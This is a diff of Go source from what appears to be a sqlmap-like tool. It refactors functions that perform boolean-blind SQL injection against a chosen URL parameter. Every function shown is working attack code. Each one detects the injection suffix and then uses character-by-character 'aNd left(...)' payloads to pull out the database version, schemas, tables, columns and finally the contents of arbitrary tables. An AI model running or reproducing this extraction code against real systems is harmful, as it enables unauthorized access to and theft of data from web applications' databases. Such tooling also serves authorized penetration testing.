@@ -4,40 +4,46 @@ import (
 	"fmt"
 	"github.com/EmYiQing/go-sqlmap/constant"
 	"github.com/EmYiQing/go-sqlmap/log"
+	"github.com/EmYiQing/go-sqlmap/parse"
 	"github.com/EmYiQing/go-sqlmap/util"
 	"strconv"
 	"strings"
 )
 
 // GetBoolBlindSuffix 检测盲注的闭合符
-func GetBoolBlindSuffix(target string, suffixList []string) (bool, string) {
+func GetBoolBlindSuffix(fixUrl parse.BaseUrl, paramKey string, suffixList []string) (bool, string) {
+	temp := fixUrl.Params[paramKey]
 	for _, v := range suffixList {
-		_, _, trueBody := util.Request(constant.RequestMethod,
-			target+v+constant.BlindDetectTruePayload, nil, nil)
-		_, _, falseBody := util.Request(constant.RequestMethod,
-			target+v+constant.BlindDetectFalsePayload, nil, nil)
-		if string(trueBody) != string(falseBody) {
+		fixUrl.SetParam(paramKey, temp+v+constant.BlindDetectTruePayload)
+		trueResp := fixUrl.SendRequestByBaseUrl()
+		fixUrl.SetParam(paramKey, temp+v+constant.BlindDetectFalsePayload)
+		falseResp := fixUrl.SendRequestByBaseUrl()
+		if string(trueResp.Body) != string(falseResp.Body) {
+			fixUrl.SetParam(paramKey, temp)
 			return true, v
 		}
 	}
+	fixUrl.SetParam(paramKey, temp)
 	return false, ""
 }
 
 // GetVersionByBoolBlind 盲注获得版本
-func GetVersionByBoolBlind(target string, suffix string) (bool, string) {
-	_, _, defaultBody := util.Request(constant.RequestMethod,
-		target+suffix+constant.BlindDetectFalsePayload, nil, nil)
+func GetVersionByBoolBlind(fixUrl parse.BaseUrl, paramKey string, suffix string) (bool, string) {
+	temp := fixUrl.Params[paramKey]
+	defaultPayload := temp + suffix + constant.BlindDetectFalsePayload
+	fixUrl.SetParam(paramKey, defaultPayload)
+	defaultBody := fixUrl.SendRequestByBaseUrl().Body
 	var length int
 	for i := 1; ; i++ {
 		if i > 1000 {
 			break
 		}
-		payload := target + suffix + constant.Space + "aNd" + constant.Space +
+		payload := temp + suffix + constant.Space + "aNd" + constant.Space +
 			"length(version())=" + strconv.Itoa(i) + constant.Space + constant.Annotator
-		code, _, tempBody := util.Request(constant.RequestMethod,
-			payload, nil, nil)
-		if code != -1 {
-			if string(tempBody) != string(defaultBody) {
+		fixUrl.SetParam(paramKey, payload)
+		tempResp := fixUrl.SendRequestByBaseUrl()
+		if tempResp.Code != -1 {
+			if string(tempResp.Body) != string(defaultBody) {
 				length = i
 				break
 			}
@@ -48,13 +54,13 @@ func GetVersionByBoolBlind(target string, suffix string) (bool, string) {
 	for i := 1; i < length+1; i++ {
 		for a := 32; a < 127; a++ {
 			tempStr := string(rune(a))
-			payload := target + suffix + constant.Space + "aNd" + constant.Space +
+			payload := temp + suffix + constant.Space + "aNd" + constant.Space +
 				"left(version()," + strconv.Itoa(i) + ")='" + data + tempStr + "'" +
 				constant.Space + constant.Annotator
-			code, _, tempBody := util.Request(constant.RequestMethod,
-				payload, nil, nil)
-			if code != -1 {
-				if string(tempBody) != string(defaultBody) {
+			fixUrl.SetParam(paramKey, payload)
+			tempResp := fixUrl.SendRequestByBaseUrl()
+			if tempResp.Code != -1 {
+				if string(tempResp.Body) != string(defaultBody) {
 					fmt.Print(tempStr)
 					data += tempStr
 					break
@@ -64,26 +70,30 @@ func GetVersionByBoolBlind(target string, suffix string) (bool, string) {
 	}
 	fmt.Print("\n")
 	if len(data) > 0 {
+		fixUrl.SetParam(paramKey, temp)
 		return true, data
 	}
+	fixUrl.SetParam(paramKey, temp)
 	return false, data
 }
 
 // GetCurrentDatabaseByBoolBlind 盲注获得当前数据库
-func GetCurrentDatabaseByBoolBlind(target string, suffix string) (bool, string) {
-	_, _, defaultBody := util.Request(constant.RequestMethod,
-		target+suffix+constant.BlindDetectFalsePayload, nil, nil)
+func GetCurrentDatabaseByBoolBlind(fixUrl parse.BaseUrl, paramKey string, suffix string) (bool, string) {
+	temp := fixUrl.Params[paramKey]
+	defaultPayload := temp + suffix + constant.BlindDetectFalsePayload
+	fixUrl.SetParam(paramKey, defaultPayload)
+	defaultBody := fixUrl.SendRequestByBaseUrl().Body
 	var length int
 	for i := 1; ; i++ {
 		if i > 1000 {
 			break
 		}
-		payload := target + suffix + constant.Space + "aNd" + constant.Space +
+		payload := temp + suffix + constant.Space + "aNd" + constant.Space +
 			"length(database())=" + strconv.Itoa(i) + constant.Space + constant.Annotator
-		code, _, tempBody := util.Request(constant.RequestMethod,
-			payload, nil, nil)
-		if code != -1 {
-			if string(tempBody) != string(defaultBody) {
+		fixUrl.SetParam(paramKey, payload)
+		tempResp := fixUrl.SendRequestByBaseUrl()
+		if tempResp.Code != -1 {
+			if string(tempResp.Body) != string(defaultBody) {
 				length = i
 				break
 			}
@@ -94,13 +104,13 @@ func GetCurrentDatabaseByBoolBlind(target string, suffix string) (bool, string) 
 	for i := 1; i < length+1; i++ {
 		for a := 32; a < 127; a++ {
 			tempStr := string(rune(a))
-			payload := target + suffix + constant.Space + "aNd" + constant.Space +
+			payload := temp + suffix + constant.Space + "aNd" + constant.Space +
 				"left(database()," + strconv.Itoa(i) + ")='" + data + tempStr + "'" +
 				constant.Space + constant.Annotator
-			code, _, tempBody := util.Request(constant.RequestMethod,
-				payload, nil, nil)
-			if code != -1 {
-				if string(tempBody) != string(defaultBody) {
+			fixUrl.SetParam(paramKey, payload)
+			tempResp := fixUrl.SendRequestByBaseUrl()
+			if tempResp.Code != -1 {
+				if string(tempResp.Body) != string(defaultBody) {
 					fmt.Print(tempStr)
 					data += tempStr
 					break
@@ -110,27 +120,31 @@ func GetCurrentDatabaseByBoolBlind(target string, suffix string) (bool, string) 
 	}
 	fmt.Print("\n")
 	if len(data) > 0 {
+		fixUrl.SetParam(paramKey, temp)
 		return true, data
 	}
+	fixUrl.SetParam(paramKey, temp)
 	return false, data
 }
 
 // GetAllDatabasesByBoolBlind 盲注获得所有数据库
-func GetAllDatabasesByBoolBlind(target string, suffix string) {
-	_, _, defaultBody := util.Request(constant.RequestMethod,
-		target+suffix+constant.BlindDetectFalsePayload, nil, nil)
+func GetAllDatabasesByBoolBlind(fixUrl parse.BaseUrl, paramKey string, suffix string) {
+	temp := fixUrl.Params[paramKey]
+	defaultPayload := temp + suffix + constant.BlindDetectFalsePayload
+	fixUrl.SetParam(paramKey, defaultPayload)
+	defaultBody := fixUrl.SendRequestByBaseUrl().Body
 	var count int
 	for i := 1; ; i++ {
 		if i > 1000 {
 			break
 		}
-		payload := target + suffix + constant.Space + "aNd" + constant.Space +
+		payload := temp + suffix + constant.Space + "aNd" + constant.Space +
 			"(select%20count(schema_name)%20from%20information_schema.schemata)=" +
 			strconv.Itoa(i) + constant.Space + constant.Annotator
-		code, _, tempBody := util.Request(constant.RequestMethod,
-			payload, nil, nil)
-		if code != -1 {
-			if string(tempBody) != string(defaultBody) {
+		fixUrl.SetParam(paramKey, payload)
+		tempResp := fixUrl.SendRequestByBaseUrl()
+		if tempResp.Code != -1 {
+			if string(tempResp.Body) != string(defaultBody) {
 				count = i
 				break
 			}
@@ -143,24 +157,24 @@ func GetAllDatabasesByBoolBlind(target string, suffix string) {
 			if i > 1000 {
 				break
 			}
-			payload := target + suffix + constant.Space + "aNd" + constant.Space +
+			payload := temp + suffix + constant.Space + "aNd" + constant.Space +
 				"(select%20length(schema_name)%20from%20information_schema.schemata%20limit%20" + strconv.Itoa(c) + ",1)=" +
 				strconv.Itoa(i) + constant.Space + constant.Annotator
-			code, _, tempBody := util.Request(constant.RequestMethod,
-				payload, nil, nil)
-			if code != -1 {
-				if string(tempBody) != string(defaultBody) {
+			fixUrl.SetParam(paramKey, payload)
+			tempResp := fixUrl.SendRequestByBaseUrl()
+			if tempResp.Code != -1 {
+				if string(tempResp.Body) != string(defaultBody) {
 					for j := 1; j < i+1; j++ {
 						for a := 32; a < 127; a++ {
 							tempStr := string(rune(a))
-							innerPayload := target + suffix + constant.Space + "aNd" + constant.Space +
+							innerPayload := temp + suffix + constant.Space + "aNd" + constant.Space +
 								"left((select%20schema_name%20from%20information_schema.schemata%20limit%20" +
 								strconv.Itoa(c) + ",1)," + strconv.Itoa(j) + ")='" + tempData + tempStr + "'" +
 								constant.Space + constant.Annotator
-							innerCode, _, innerTempBody := util.Request(constant.RequestMethod,
-								innerPayload, nil, nil)
-							if innerCode != -1 {
-								if string(innerTempBody) != string(defaultBody) {
+							fixUrl.SetParam(paramKey, innerPayload)
+							innerResp := fixUrl.SendRequestByBaseUrl()
+							if innerResp.Code != -1 {
+								if string(innerResp.Body) != string(defaultBody) {
 									tempData += tempStr
 									break
 								}
@@ -175,28 +189,31 @@ func GetAllDatabasesByBoolBlind(target string, suffix string) {
 			}
 		}
 	}
+	fixUrl.SetParam(paramKey, temp)
 	util.PrintDatabases(
 		util.ConvertString(
 			util.DeleteLastChar(data)))
 }
 
 // GetAllTablesByBoolBlind 盲注获得表
-func GetAllTablesByBoolBlind(target string, suffix string, database string) {
-	_, _, defaultBody := util.Request(constant.RequestMethod,
-		target+suffix+constant.BlindDetectFalsePayload, nil, nil)
+func GetAllTablesByBoolBlind(fixUrl parse.BaseUrl, paramKey string, suffix string, database string) {
+	temp := fixUrl.Params[paramKey]
+	defaultPayload := temp + suffix + constant.BlindDetectFalsePayload
+	fixUrl.SetParam(paramKey, defaultPayload)
+	defaultBody := fixUrl.SendRequestByBaseUrl().Body
 	var count int
 	for i := 1; ; i++ {
 		if i > 1000 {
 			break
 		}
-		payload := target + suffix + constant.Space + "aNd" + constant.Space +
+		payload := temp + suffix + constant.Space + "aNd" + constant.Space +
 			"(select%20count(table_name)%20from%20information_schema.tables%20" +
 			"where%20table_schema='" + database + "')=" +
 			strconv.Itoa(i) + constant.Space + constant.Annotator
-		code, _, tempBody := util.Request(constant.RequestMethod,
-			payload, nil, nil)
-		if code != -1 {
-			if string(tempBody) != string(defaultBody) {
+		fixUrl.SetParam(paramKey, payload)
+		resp := fixUrl.SendRequestByBaseUrl()
+		if resp.Code != -1 {
+			if string(resp.Body) != string(defaultBody) {
 				count = i
 				break
 			}
@@ -209,26 +226,26 @@ func GetAllTablesByBoolBlind(target string, suffix string, database string) {
 			if i > 1000 {
 				break
 			}
-			payload := target + suffix + constant.Space + "aNd" + constant.Space +
+			payload := temp + suffix + constant.Space + "aNd" + constant.Space +
 				"(select%20length(table_name)%20from%20information_schema.tables%20where%20table_schema='" +
 				database + "'%20limit%20" + strconv.Itoa(c) + ",1)=" +
 				strconv.Itoa(i) + constant.Space + constant.Annotator
-			code, _, tempBody := util.Request(constant.RequestMethod,
-				payload, nil, nil)
-			if code != -1 {
-				if string(tempBody) != string(defaultBody) {
+			fixUrl.SetParam(paramKey, payload)
+			tempResp := fixUrl.SendRequestByBaseUrl()
+			if tempResp.Code != -1 {
+				if string(tempResp.Body) != string(defaultBody) {
 					for j := 1; j < i+1; j++ {
 						for a := 32; a < 127; a++ {
 							tempStr := string(rune(a))
-							innerPayload := target + suffix + constant.Space + "aNd" + constant.Space +
+							innerPayload := temp + suffix + constant.Space + "aNd" + constant.Space +
 								"left((select%20table_name%20from%20information_schema.tables%20" +
 								"where%20table_schema='" + database + "'%20limit%20" +
 								strconv.Itoa(c) + ",1)," + strconv.Itoa(j) + ")='" + tempData + tempStr + "'" +
 								constant.Space + constant.Annotator
-							innerCode, _, innerTempBody := util.Request(constant.RequestMethod,
-								innerPayload, nil, nil)
-							if innerCode != -1 {
-								if string(innerTempBody) != string(defaultBody) {
+							fixUrl.SetParam(paramKey, innerPayload)
+							innerResp := fixUrl.SendRequestByBaseUrl()
+							if innerResp.Code != -1 {
+								if string(innerResp.Body) != string(defaultBody) {
 									tempData += tempStr
 									break
 								}
@@ -243,28 +260,31 @@ func GetAllTablesByBoolBlind(target string, suffix string, database string) {
 			}
 		}
 	}
+	fixUrl.SetParam(paramKey, temp)
 	util.PrintTables(
 		util.ConvertString(
 			util.DeleteLastChar(data)))
 }
 
 // GetAllColumnsByBoolBlind 盲注获得字段
-func GetAllColumnsByBoolBlind(target string, suffix string, database string, table string) {
-	_, _, defaultBody := util.Request(constant.RequestMethod,
-		target+suffix+constant.BlindDetectFalsePayload, nil, nil)
+func GetAllColumnsByBoolBlind(fixUrl parse.BaseUrl, paramKey string, suffix string, database string, table string) {
+	temp := fixUrl.Params[paramKey]
+	defaultPayload := temp + suffix + constant.BlindDetectFalsePayload
+	fixUrl.SetParam(paramKey, defaultPayload)
+	defaultBody := fixUrl.SendRequestByBaseUrl().Body
 	var count int
 	for i := 1; ; i++ {
 		if i > 1000 {
 			break
 		}
-		payload := target + suffix + constant.Space + "aNd" + constant.Space +
+		payload := temp + suffix + constant.Space + "aNd" + constant.Space +
 			"(select%20count(column_name)%20from%20information_schema.columns%20" +
 			"where%20table_name='" + table + "'%20and%20table_schema='" + database + "')=" +
 			strconv.Itoa(i) + constant.Space + constant.Annotator
-		code, _, tempBody := util.Request(constant.RequestMethod,
-			payload, nil, nil)
-		if code != -1 {
-			if string(tempBody) != string(defaultBody) {
+		fixUrl.SetParam(paramKey, payload)
+		resp := fixUrl.SendRequestByBaseUrl()
+		if resp.Code != -1 {
+			if string(resp.Body) != string(defaultBody) {
 				count = i
 				break
 			}
@@ -277,26 +297,26 @@ func GetAllColumnsByBoolBlind(target string, suffix string, database string, tab
 			if i > 1000 {
 				break
 			}
-			payload := target + suffix + constant.Space + "aNd" + constant.Space +
+			payload := temp + suffix + constant.Space + "aNd" + constant.Space +
 				"(select%20length(column_name)%20from%20information_schema.columns%20where%20table_schema='" +
 				database + "'%20and%20table_name='" + table + "'%20limit%20" + strconv.Itoa(c) + ",1)=" +
 				strconv.Itoa(i) + constant.Space + constant.Annotator
-			code, _, tempBody := util.Request(constant.RequestMethod,
-				payload, nil, nil)
-			if code != -1 {
-				if string(tempBody) != string(defaultBody) {
+			fixUrl.SetParam(paramKey, payload)
+			tempResp := fixUrl.SendRequestByBaseUrl()
+			if tempResp.Code != -1 {
+				if string(tempResp.Body) != string(defaultBody) {
 					for j := 1; j < i+1; j++ {
 						for a := 32; a < 127; a++ {
 							tempStr := string(rune(a))
-							innerPayload := target + suffix + constant.Space + "aNd" + constant.Space +
+							innerPayload := temp + suffix + constant.Space + "aNd" + constant.Space +
 								"left((select%20column_name%20from%20information_schema.columns%20" +
 								"where%20table_schema='" + database + "'%20and%20table_name='" + table + "'%20limit%20" +
 								strconv.Itoa(c) + ",1)," + strconv.Itoa(j) + ")='" + tempData + tempStr + "'" +
 								constant.Space + constant.Annotator
-							innerCode, _, innerTempBody := util.Request(constant.RequestMethod,
-								innerPayload, nil, nil)
-							if innerCode != -1 {
-								if string(innerTempBody) != string(defaultBody) {
+							fixUrl.SetParam(paramKey, innerPayload)
+							innerResp := fixUrl.SendRequestByBaseUrl()
+							if innerResp.Code != -1 {
+								if string(innerResp.Body) != string(defaultBody) {
 									tempData += tempStr
 									break
 								}
@@ -311,15 +331,18 @@ func GetAllColumnsByBoolBlind(target string, suffix string, database string, tab
 			}
 		}
 	}
+	fixUrl.SetParam(paramKey, temp)
 	util.PrintColumns(
 		util.ConvertString(
 			util.DeleteLastChar(data)))
 }
 
 // GetAllDataByBoolBlind 盲注获得数据
-func GetAllDataByBoolBlind(target string, suffix string, database string, table string, columns []string) {
-	_, _, defaultBody := util.Request(constant.RequestMethod,
-		target+suffix+constant.BlindDetectFalsePayload, nil, nil)
+func GetAllDataByBoolBlind(fixUrl parse.BaseUrl, paramKey string, suffix string, database string, table string, columns []string) {
+	temp := fixUrl.Params[paramKey]
+	defaultPayload := temp + suffix + constant.BlindDetectFalsePayload
+	fixUrl.SetParam(paramKey, defaultPayload)
+	defaultBody := fixUrl.SendRequestByBaseUrl().Body
 
 	tempPayload := "concat("
 	for _, v := range columns {
@@ -334,13 +357,13 @@ func GetAllDataByBoolBlind(target string, suffix string, database string, table 
 		if i > 1000 {
 			break
 		}
-		payload := target + suffix + constant.Space + "aNd" + constant.Space +
+		payload := temp + suffix + constant.Space + "aNd" + constant.Space +
 			"(select%20count(" + tempPayload + ")%20from%20" + database + "." + table + ")=" +
 			strconv.Itoa(i) + constant.Space + constant.Annotator
-		code, _, tempBody := util.Request(constant.RequestMethod,
-			payload, nil, nil)
-		if code != -1 {
-			if string(tempBody) != string(defaultBody) {
+		fixUrl.SetParam(paramKey, payload)
+		resp := fixUrl.SendRequestByBaseUrl()
+		if resp.Code != -1 {
+			if string(resp.Body) != string(defaultBody) {
 				count = i
 				break
 			}
@@ -353,25 +376,25 @@ func GetAllDataByBoolBlind(target string, suffix string, database string, table 
 			if i > 1000 {
 				break
 			}
-			payload := target + suffix + constant.Space + "aNd" + constant.Space +
+			payload := temp + suffix + constant.Space + "aNd" + constant.Space +
 				"(select%20length(" + tempPayload + ")%20from%20" + database + "." +
 				table + "%20limit%20" + strconv.Itoa(c) + ",1)=" +
 				strconv.Itoa(i) + constant.Space + constant.Annotator
-			code, _, tempBody := util.Request(constant.RequestMethod,
-				payload, nil, nil)
-			if code != -1 {
-				if string(tempBody) != string(defaultBody) {
+			fixUrl.SetParam(paramKey, payload)
+			resp := fixUrl.SendRequestByBaseUrl()
+			if resp.Code != -1 {
+				if string(resp.Body) != string(defaultBody) {
 					for j := 1; j < i+1; j++ {
 						for a := 32; a < 127; a++ {
 							tempStr := string(rune(a))
-							innerPayload := target + suffix + constant.Space + "aNd" + constant.Space +
+							innerPayload := temp + suffix + constant.Space + "aNd" + constant.Space +
 								"left((select%20" + tempPayload + "%20from%20" + database + "." + table + "%20limit%20" +
 								strconv.Itoa(c) + ",1)," + strconv.Itoa(j) + ")='" + tempData + tempStr + "'" +
 								constant.Space + constant.Annotator
-							innerCode, _, innerTempBody := util.Request(constant.RequestMethod,
-								innerPayload, nil, nil)
-							if innerCode != -1 {
-								if string(innerTempBody) != string(defaultBody) {
+							fixUrl.SetParam(paramKey, innerPayload)
+							innerResp := fixUrl.SendRequestByBaseUrl()
+							if innerResp.Code != -1 {
+								if string(innerResp.Body) != string(defaultBody) {
 									tempData += tempStr
 									break
 								}
@@ -389,12 +412,13 @@ func GetAllDataByBoolBlind(target string, suffix string, database string, table 
 	log.Info("get data success")
 	var output [][]string
 	for _, v := range data {
-		var temp []string
+		var innerTemp []string
 		params := strings.Split(v, ":")
 		for _, innerV := range params {
-			temp = append(temp, innerV)
+			innerTemp = append(innerTemp, innerV)
 		}
-		output = append(output, temp)
+		output = append(output, innerTemp)
 	}
+	fixUrl.SetParam(paramKey, temp)
 	util.PrintData(util.ConvertInterfaceArray(columns, output))
 }
